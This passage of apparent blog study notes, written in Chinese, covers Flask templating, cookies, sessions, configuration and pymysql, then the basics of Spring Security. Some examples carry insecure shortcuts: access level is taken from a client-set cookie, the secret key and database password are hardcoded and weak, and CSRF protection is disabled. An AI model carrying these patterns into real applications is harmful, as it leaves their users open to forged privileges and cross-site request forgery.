id="python路由部分返回"><a href="#python路由部分返回" class="headerlink" title="python路由部分返回"></a>python路由部分返回</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/daicanshu/&lt;id&gt;&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bbb</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;child.html&quot;</span>,ida=<span class="hljs-built_in">id</span>)<br></code></pre></td></tr></table></figure><p>这个还进行了参数传递,ida就是页面要接收的数据</p><h3 id="过滤器部分"><a href="#过滤器部分" class="headerlink" title="过滤器部分"></a>过滤器部分</h3><p>自定义过滤器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#首先是route</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/list&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">a_list</span>():<br>    aaaaa=[<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;3&quot;</span>]<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;tempa.html&quot;</span>,aList=aaaaa)<br>    <br><span class="hljs-comment">#然后定义过滤器</span><br><span class="hljs-meta">@app.template_filter(<span class="hljs-params"><span class="hljs-string">&#x27;dore&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_reverse</span>(<span class="hljs-params">li</span>):<br>    temp = <span class="hljs-built_in">list</span>(li)<br>    temp.reverse()<br>    <span class="hljs-keyword">return</span> temp<br></code></pre></td></tr></table></figure><p>html部分</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;&#123;aList | dore&#125;&#125;<br></code></pre></td></tr></table></figure><p>这句话的意思是将aList这个变量传递给名字叫dore这个过滤器</p><p>jinjia2自带的过滤器</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;&#123; range(1,100) | random &#125;&#125;<br></code></pre></td></tr></table></figure><p>random是自带的</p><h3 id="jinjia2的if和for"><a href="#jinjia2的if和for" class="headerlink" title="jinjia2的if和for"></a>jinjia2的if和for</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&#123;% for item in aList %&#125;<br> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>&#123;&#123;item&#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">hr</span>&gt;</span><br>&#123;% endfor %&#125;<br><br>&#123;% for num in range(1,10) %&#125;<br> <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>&#123;&#123;num&#125;&#125; 号<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>&#123;% endfor %&#125;<br><br>&#123;% if vip == 0 %&#125;<br> <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>你没充值<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br> &#123;% elif vip ==1 %&#125;<br> <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>lv1的内容<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br></code></pre></td></tr></table></figure><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><h4 id="第一种-返回一个response"><a href="#第一种-返回一个response" class="headerlink" title="第一种,返回一个response"></a>第一种,返回一个response</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    response = flask.make_response(<span class="hljs-string">&quot;success&quot;</span>)<br>    response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;wodiu&quot;</span>,max_age=<span class="hljs-number">1000</span>)<br>    response.set_cookie(<span class="hljs-string">&quot;type&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>,max_age=<span class="hljs-number">1000</span>)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><p>获取的时候</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login_success&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login_success</span>():<br>    vip = <span class="hljs-built_in">int</span>(request.cookies.get(<span class="hljs-string">&quot;type&quot;</span>))<br>    <span class="hljs-keyword">return</span> flask.render_template(<span class="hljs-string">&quot;tempa.html&quot;</span>,vip=vip)<br></code></pre></td></tr></table></figure><p>想要删除的时候</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    response = flask.make_response(<span class="hljs-string">&#x27;退出&#x27;</span>)<br>    response.delete_cookie(<span class="hljs-string">&#x27;name&#x27;</span>)<br>    response.delete_cookie(<span class="hljs-string">&#x27;type&#x27;</span>)<br>    <span class="hljs-keyword">return</span> response<br></code></pre></td></tr></table></figure><h4 id="第二种-使用变量"><a href="#第二种-使用变量" class="headerlink" title="第二种,使用变量"></a>第二种,使用变量</h4><p>创建session的时候添加变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login/&lt;id&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b_page</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    <span class="hljs-comment">#设置cookie</span><br>    session[<span class="hljs-string">&#x27;user_id&#x27;</span>]=<span class="hljs-built_in">id</span><br>    session[<span class="hljs-string">&#x27;vip&#x27;</span>] = <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;success&#x27;</span><br></code></pre></td></tr></table></figure><p>删除session中的变量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout2&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout2</span>():<br>    <span class="hljs-comment">#session.pop(&#x27;user_id&#x27;,None)</span><br>    <span class="hljs-comment">#session.pop(&#x27;vip&#x27;,None)</span><br><br>    <span class="hljs-comment">#session[&#x27;user_id&#x27;]=False</span><br><br>    session.clear()<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;logout&#x27;</span><br></code></pre></td></tr></table></figure><p>三种方法</p><ul><li>pop(键)方法</li><li>将值设为False</li><li>clear()方法</li></ul><h3 id="Flask的配置参数"><a href="#Flask的配置参数" class="headerlink" title="Flask的配置参数"></a>Flask的配置参数</h3><p>就是对最开始的app变量进行配置</p><p>举个例子:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#配置加密字符串</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>]=<span class="hljs-string">&quot;key123&quot;</span><br><span class="hljs-comment">#设置7天有效</span><br>app.config[<span class="hljs-string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>]=timedelta(days=<span class="hljs-number">7</span>)<br></code></pre></td></tr></table></figure><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs nsis">&#123;<br>    <span class="hljs-string">&#x27;DEBUG&#x27;</span>: <span class="hljs-literal">False</span>,  <span class="hljs-comment"># 是否开启Debug模式</span><br>    <span class="hljs-string">&#x27;TESTING&#x27;</span>: <span class="hljs-literal">False</span>,  <span class="hljs-comment"># 是否开启测试模式</span><br>    <span class="hljs-string">&#x27;PROPAGATE_EXCEPTIONS&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 异常传播(是否在控制台打印LOG) 当Debug或者testing开启后,自动为True</span><br>    <span class="hljs-string">&#x27;PRESERVE_CONTEXT_ON_EXCEPTION&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 一两句话说不清楚,一般不用它</span><br>    <span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 之前遇到过,在启用Session的时候,一定要有它</span><br>    <span class="hljs-string">&#x27;PERMANENT_SESSION_LIFETIME&#x27;</span>: <span class="hljs-number">31</span>,  <span class="hljs-comment"># days , Session的生命周期(天)默认31天</span><br>    <span class="hljs-string">&#x27;USE_X_SENDFILE&#x27;</span>: <span class="hljs-literal">False</span>,  <span class="hljs-comment"># 是否弃用 x_sendfile</span><br>    <span class="hljs-string">&#x27;LOGGER_NAME&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 日志记录器的名称</span><br>    <span class="hljs-string">&#x27;LOGGER_HANDLER_POLICY&#x27;</span>: <span class="hljs-string">&#x27;always&#x27;</span>,<br>    <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 服务访问域名</span><br>    <span class="hljs-string">&#x27;APPLICATION_ROOT&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 项目的完整路径</span><br>    <span class="hljs-string">&#x27;SESSION_COOKIE_NAME&#x27;</span>: <span class="hljs-string">&#x27;session&#x27;</span>,  <span class="hljs-comment"># 在cookies中存放session加密字符串的名字</span><br>    <span class="hljs-string">&#x27;SESSION_COOKIE_DOMAIN&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 在哪个域名下会产生session记录在cookies中</span><br>    <span class="hljs-string">&#x27;SESSION_COOKIE_PATH&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># cookies的路径</span><br>    <span class="hljs-string">&#x27;SESSION_COOKIE_HTTPONLY&#x27;</span>: <span class="hljs-literal">True</span>,  <span class="hljs-comment"># 控制 cookie 是否应被设置 httponly 的标志，</span><br>    <span class="hljs-string">&#x27;SESSION_COOKIE_SECURE&#x27;</span>: <span class="hljs-literal">False</span>,  <span class="hljs-comment"># 控制 cookie 是否应被设置安全标志</span><br>    <span class="hljs-string">&#x27;SESSION_REFRESH_EACH_REQUEST&#x27;</span>: <span class="hljs-literal">True</span>,  <span class="hljs-comment"># 这个标志控制永久会话如何刷新</span><br>    <span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>: <span class="hljs-literal">None</span>,  <span class="hljs-comment"># 如果设置为字节数， Flask 会拒绝内容长度大于此值的请求进入，并返回一个 413 状态码</span><br>    <span class="hljs-string">&#x27;SEND_FILE_MAX_AGE_DEFAULT&#x27;</span>: <span class="hljs-number">12</span>,  <span class="hljs-comment"># hours 默认缓存控制的最大期限</span><br>    <span class="hljs-string">&#x27;TRAP_BAD_REQUEST_ERRORS&#x27;</span>: <span class="hljs-literal">False</span>,<br>    <span class="hljs-comment"># 如果这个值被设置为 True ，Flask不会执行 HTTP 异常的错误处理，而是像对待其它异常一样，</span><br>    <span class="hljs-comment"># 通过异常栈让它冒泡地抛出。这对于需要找出 HTTP 异常源头的可怕调试情形是有用的。</span><br>    <span class="hljs-string">&#x27;TRAP_HTTP_EXCEPTIONS&#x27;</span>: <span class="hljs-literal">False</span>,<br>    <span class="hljs-comment"># Werkzeug 处理请求中的特定数据的内部数据结构会抛出同样也是“错误的请求”异常的特殊的 key errors 。</span><br>    <span class="hljs-comment"># 同样地，为了保持一致，许多操作可以显式地抛出 BadRequest 异常。</span><br>    <span class="hljs-comment"># 因为在调试中，你希望准确地找出异常的原因，这个设置用于在这些情形下调试。</span><br>    <span class="hljs-comment"># 如果这个值被设置为 True ，你只会得到常规的回溯。</span><br>    <span class="hljs-string">&#x27;EXPLAIN_TEMPLATE_LOADING&#x27;</span>: <span class="hljs-literal">False</span>,<br>    <span class="hljs-string">&#x27;PREFERRED_URL_SCHEME&#x27;</span>: <span class="hljs-string">&#x27;http&#x27;</span>,  <span class="hljs-comment"># 生成URL的时候如果没有可用的 URL 模式话将使用这个值</span><br>    <span class="hljs-string">&#x27;JSON_AS_ASCII&#x27;</span>: <span class="hljs-literal">True</span>,<br>    <span class="hljs-comment"># 默认情况下 Flask 使用 ascii 编码来序列化对象。如果这个值被设置为 False ，</span><br>    <span class="hljs-comment"># Flask不会将其编码为 ASCII，并且按原样输出，返回它的 unicode 字符串。</span><br>    <span class="hljs-comment"># 比如 jsonfiy 会自动地采用 utf-8 来编码它然后才进行传输。</span><br>    <span class="hljs-string">&#x27;JSON_SORT_KEYS&#x27;</span>: <span class="hljs-literal">True</span>,<br>    <span class="hljs-comment">#默认情况下 Flask 按照 JSON 对象的键的顺序来序来序列化它。</span><br>    <span class="hljs-comment"># 这样做是为了确保键的顺序不会受到字典的哈希种子的影响，从而返回的值每次都是一致的，不会造成无用的额外 HTTP 缓存。</span><br>    <span class="hljs-comment"># 你可以通过修改这个配置的值来覆盖默认的操作。但这是不被推荐的做法因为这个默认的行为可能会给你在性能的代价上带来改善。</span><br>    <span class="hljs-string">&#x27;JSONIFY_PRETTYPRINT_REGULAR&#x27;</span>: <span class="hljs-literal">True</span>,<br>    <span class="hljs-string">&#x27;JSONIFY_MIMETYPE&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>,<br>    <span class="hljs-string">&#x27;TEMPLATES_AUTO_RELOAD&#x27;</span>: <span class="hljs-literal">None</span>,<br>&#125;<br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/songzhixue/p/11171458.html">https://www.cnblogs.com/songzhixue/p/11171458.html</a></p><h3 id="重定向和转发"><a href="#重定向和转发" class="headerlink" title="重定向和转发"></a>重定向和转发</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/redirect&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">a_page</span>():<br>    <span class="hljs-comment">#站外</span><br>    <span class="hljs-comment">#return flask.redirect(&#x27;http://www.cctv.com&#x27;)</span><br>    <span class="hljs-comment">#站内</span><br>    <span class="hljs-keyword">return</span> flask.redirect(flask.url_for(<span class="hljs-string">&#x27;b_page&#x27;</span>))<br></code></pre></td></tr></table></figure><p>那么问题来了:smirk:转发和重定向的区别是啥:</p><p>转发就是将,请求所带的数据重新向站内的路由进行转发.</p><p>重定向就是让用户用浏览器重新向目标网站重新发一遍请求</p><table><thead><tr><th></th><th>转发</th><th>重定向</th></tr></thead><tbody><tr><td>跳转方式</td><td>服务器端转发</td><td>客户端转发</td></tr><tr><td>客户端发送请求次数</td><td>1次</td><td>2次</td></tr><tr><td>客户端地址栏是否改变</td><td>不变</td><td>变</td></tr><tr><td>是否共享request域</td><td>共享</td><td>不共享（request域中的数据丢失），必须使用session传递属性</td></tr><tr><td>是否共享response域</td><td>共享</td><td>不共享</td></tr><tr><td>范围</td><td>网站内</td><td>可以跨站点</td></tr><tr><td>JSP</td><td>URL不可带参数</td><td>URL可带参数</td></tr><tr><td>是否隐藏路径</td><td>隐藏</td><td>不隐藏</td></tr></tbody></table><h3 id="结合SQL"><a href="#结合SQL" class="headerlink" title="结合SQL"></a>结合SQL</h3><p>导入pymysql</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pymysql<br><br>db = pymysql.connect(host=<span class="hljs-string">&quot;localhost&quot;</span> <span class="hljs-comment">#设置ip</span><br>                     ,user=<span class="hljs-string">&quot;root&quot;</span><span class="hljs-comment">#设置用户名</span><br>                     ,password=<span class="hljs-string">&quot;123456&quot;</span><span class="hljs-comment">#设置密码</span><br>                     ,db=<span class="hljs-string">&quot;wodiu&quot;</span>)<span class="hljs-comment">#设置数据库</span><br>cur = db.cursor()<span class="hljs-comment">#获取一个游标</span><br>cur.execute(<span class="hljs-string">&quot;select * from aaa&quot;</span>)<span class="hljs-comment">#执行语句</span><br>db.commit()<span class="hljs-comment">#提交语句并执行</span><br><span class="hljs-type">List</span>=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cur.fetchall():<span class="hljs-comment">#cur.fetchall是获取所有的数据</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>(i))<br><br></code></pre></td></tr></table></figure><blockquote><p>db.rollback() #可以使用这条命令,如果发生异常时进行滚回</p></blockquote><p>下面时sql的查询操作</p><ul><li><strong>fetchone():</strong> 该方法获取下一个查询结果集。结果集是一个对象</li><li><strong>fetchall():</strong> 接收全部的返回结果行.</li><li><strong>rowcount:</strong> 这是一个只读属性，并返回执行execute()方法后影响的行数。</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>后端</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringSecurity</title>
    <link href="/2022/01/10/SpringSecurity/"/>
    <url>/2022/01/10/SpringSecurity/</url>
    
    <content type="html"><![CDATA[<h1 id="SpringSecurity-learn"><a href="#SpringSecurity-learn" class="headerlink" title="SpringSecurity-learn"></a>SpringSecurity-learn</h1><p>springsecurity深入浅出–王松 2021年出版学习笔记</p><h1 id="SpringSecurity啦啦啦"><a href="#SpringSecurity啦啦啦" class="headerlink" title="SpringSecurity啦啦啦"></a>SpringSecurity啦啦啦</h1><h3 id="认证与授权"><a href="#认证与授权" class="headerlink" title="认证与授权"></a>认证与授权</h3><h4 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h4><p>用户的信息主要用Authentication来保存</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Authentication</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Principal</span>, Serializable &#123;<br>    Collection&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GrantedAuthority</span>&gt; getAuthorities();<span class="hljs-comment">//获取权限</span><br><br>    Object <span class="hljs-title function_">getCredentials</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取用户凭证</span><br><br>    Object <span class="hljs-title function_">getDetails</span><span class="hljs-params">()</span>;<span class="hljs-comment">//携带参数</span><br><br>    Object <span class="hljs-title function_">getPrincipal</span><span class="hljs-params">()</span>;<span class="hljs-comment">//获取当前用户</span><br><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAuthenticated</span><span class="hljs-params">()</span>;<span class="hljs-comment">//是否认证成功</span><br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAuthenticated</span><span class="hljs-params">(<span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> IllegalArgumentException;<br>&#125;<br></code></pre></td></tr></table></figure><p>当用户使用用户名／密码登录或使用Remember-me登录时，都会对应一个不同的Authentication实例</p><p>Spring Security中的认证工作主要由AuthenticationManager接口来负责</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">AuthenticationManager</span> &#123;<br>    Authentication <span class="hljs-title function_">authenticate</span><span class="hljs-params">(Authentication var1)</span> <span class="hljs-keyword">throws</span> AuthenticationException;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果返回Authentication代表认证成功</p><p>抛出异常则认证失败</p><p>返回null则不能断定</p><blockquote><p>AuthenticationManager最主要的实现类是ProviderManager,而他用来管理AuthenticationProvider,在这个类中有一个supports方法用来检测是否支持给定的Authentication类型。而Authentication有着众多的实现类，但不是每个项目都支持所以菜肴进行检测，例如有的项目需要短信认证登录认证</p></blockquote><p>ProviderManager具有一个可选的parent，如果所有的认证都失败就会调用parent进行认证</p><h4 id="授权"><a href="#授权" class="headerlink" title="授权"></a>授权</h4><p>认证结束后就进行授权了</p><p>两个关键的接口:</p><ul><li>AccessDecisionManager</li><li>AccessDecisionVoter</li></ul><p>AccessDecisionVoter是个投票器,检查用户是否具有该角色然后进行投票进行赞成,反对或者弃票</p><p>AccessDecisionManager则会根据投票结果来判断用户是否有权利访问,会对AccessDecisionVoter进行遍历访问</p><p>用户请求的资源所需要的角色会被封装成ConfigAttribute对象,角色名称都带有一个ROLE_前缀，投票器AccessDecisionVoter所做的事情，其实就是比较用户所具备的角色和请求某个资源所需的ConfigAttribute之间的关系。</p><h4 id="默认不做配置开启的过滤器"><a href="#默认不做配置开启的过滤器" class="headerlink" title="默认不做配置开启的过滤器"></a>默认不做配置开启的过滤器</h4><p>认证授权都是基于过滤器</p><p><img src="/.com//package_and_data\Book\JdReaderEBooks\jd_4657302ffcbc3\30712708_dir_img\OEBPS\Images\Figure-T21_111015.jpg" alt="Figure-T21_111015"></p><p>@Order注解去调整自定义过滤器在过滤器链中的位置。</p><p>默认过滤器并不是直接放在Web项目的原生过滤器链中，而是通过一个FilterChainProxy来统一管理,不仅仅只有一个，可能会有多个,FilterChainProxy通过DelegatingFilterProxy整合到原生过滤器链中</p><p>Spring Security会将登录成功的用户信息保存到SecurityContextHolder中</p><h3 id="基本的过滤配置"><a href="#基本的过滤配置" class="headerlink" title="基本的过滤配置"></a>基本的过滤配置</h3><p>基本所有的配置类都需要继承WebSecurityConfigurerAdapter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.yh.code.springcode.Config;<br><br><span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.web.builders.HttpSecurity;<br><span class="hljs-keyword">import</span> org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;<br><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityConfig</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">WebSecurityConfigurerAdapter</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//.anyRequest().authenticated()代表所有请求认证后才能访问</span><br>        http.authorizeRequests().anyRequest().authenticated()<br>                <span class="hljs-comment">//and代表将将原来的http返回</span><br>                .and()<br>                <span class="hljs-comment">//开启表单配置</span><br>                .formLogin()<br>                <span class="hljs-comment">//设置登录页</span><br>                .loginPage(<span class="hljs-string">&quot;/index.html&quot;</span>)<br>                <span class="hljs-comment">//设置认证地址</span><br>                .loginProcessingUrl(<span class="hljs-string">&quot;/doLogin&quot;</span>)<br>                <span class="hljs-comment">//成功跳转</span><br>                .defaultSuccessUrl(<span class="hljs-string">&quot;/index&quot;</span>)<br>                <span class="hljs-comment">//失败跳转</span><br>                .failureUrl(<span class="hljs-string">&quot;/index.html&quot;</span>)<br>                <span class="hljs-comment">//接收前端表单的用户名</span><br>                .usernameParameter(<span class="hljs-string">&quot;uname&quot;</span>)<br>                <span class="hljs-comment">//接收前端表单的密码</span><br>                .passwordParameter(<span class="hljs-string">&quot;passwd&quot;</span>)<br>                <span class="hljs-comment">//代表跟登录相关的接口认证不做拦截</span><br>                .permitAll()<br>                <span class="hljs-comment">//表单配置完毕后进行返回</span><br>                .and()<br>                <span class="hljs-comment">//进行csrf配置</span><br>                .csrf()<br>                <span class="hljs-comment">//关闭csrf防御功能</span><br>                .disable();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="defaultSuccessUrl与successForwardUrl"><a href="#defaultSuccessUrl与successForwardUrl" class="headerlink" title="defaultSuccessUrl与successForwardUrl"></a>defaultSuccessUrl与successForwardUrl</h4><ul><li><p>successForwardUrl:</p><ul><li><p>用户验证成功后强行跳转到该方法设置的页面</p></li><li><blockquote><p>例如请求&#x2F;user,successForwardUrl设置为&#x2F;index</p><p>用户验证成功后跳向&#x2F;index</p></blockquote></li></ul></li><li><p>defaultSuccessUrl:</p><ul><li><p>用户验证成功后如果有自己请求的地址则调向请求地址,如果没有则跳向请求地址</p></li><li><blockquote><p>例如请求&#x2F;user,defaultSuccessUrl设置为&#x2F;index</p><p>用户验证成功后跳向&#x2F;user</p></blockquote></li><li><p>源码实际就是创建了一个SavedRequestAwareAuthenticationSuccessHandler</p></li><li><p>&#96;&#96;&#96;java<br>public final T defaultSuccessUrl(String defaultSuccessUrl, boolean alwaysUse) {<br>    SavedRequestAwareAuthenticationSuccessHandler handler &#x3D; new SavedRequestAwareAuthenticationSuccessHandler();<br>    handler.setDefaultTargetUrl(defaultSuccessUrl);<br>    handler.setAlwaysUseDefaultTargetUrl(alwaysUse);<br>    this.defaultSuccessHandler &#x3D; handler;<br>    return this.successHandler(handler);<br>}</p><figure class="highlight reasonml"><table><tr><td 